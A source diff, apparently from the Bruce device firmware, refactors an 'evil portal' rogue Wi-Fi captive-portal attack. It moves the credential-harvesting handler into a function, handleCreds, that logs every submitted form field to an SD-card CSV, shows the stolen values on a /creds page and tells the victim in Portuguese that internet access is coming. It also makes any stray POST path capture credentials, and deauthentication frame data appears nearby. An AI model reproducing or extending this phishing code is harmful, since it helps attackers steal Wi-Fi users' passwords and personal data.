@@ -23,6 +23,25 @@ const uint8_t deauth_frame_default2[] = {
     0xf0, 0xff, 0x02, 0x00
 };
 
+void handleCreds() {
+      String html_temp = "<li>";
+      String csvLine = "";
+      last_cred="";
+      for (int i = 0; i < ep->args(); i++) {
+        html_temp += ep->argName(i) + ": " + ep->arg(i) + "<br>\n";
+        // Prepara dados para salvar no SD
+        if (i != 0) {
+          csvLine += ",";
+        }
+        csvLine += ep->argName(i) + ": " + ep->arg(i);
+        last_cred += ep->argName(i).substring(0,3) + ": " + ep->arg(i) + "\n";
+      }
+      html_temp += "</li>\n";
+      saveToCSV("/Bruce_creds.csv", csvLine);
+      capturedCredentialsHtml = html_temp + capturedCredentialsHtml;
+      totalCapturedCredentials++;
+      ep->send(200, "text/html", getHtmlContents("Por favor, aguarde alguns minutos. Em breve você poderá acessar a internet.")); 
+}
 
 void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
 
@@ -61,28 +80,14 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
     ep->on("/", [](){
       ep->send(200, "text/html", html_file);
     });
-    ep->on("/post", []() {
-      String html_temp = "<li>";                                      // Else.. after all that, redirects to the page
-      String csvLine = "";
-      last_cred="";
-      for (int i = 0; i < ep->args(); i++) {
-        html_temp += ep->argName(i) + ": " + ep->arg(i) + "<br>\n";
-        // Prepara dados para salvar no SD
-        if (i != 0) {
-          csvLine += ",";
-        }
-        csvLine += ep->argName(i) + ": " + ep->arg(i);
-        last_cred += ep->argName(i).substring(0,3) + ": " + ep->arg(i) + "\n";
-      }
-      html_temp += "</li>\n";
-      saveToCSV("/Bruce_creds.csv", csvLine);
-      capturedCredentialsHtml = html_temp + capturedCredentialsHtml;
-      totalCapturedCredentials++;
-      ep->send(200, "text/html", getHtmlContents("Por favor, aguarde alguns minutos. Em breve você poderá acessar a internet.")); 
-    });
+    ep->on("/post", handleCreds);
 
     ep->onNotFound([](){
-      ep->send(200, "text/html", html_file);
+      if (ep->method() == HTTP_POST) {
+        handleCreds();
+      } else {
+        ep->send(200, "text/html", html_file);
+      }
     });
 
     ep->on("/creds", []() {
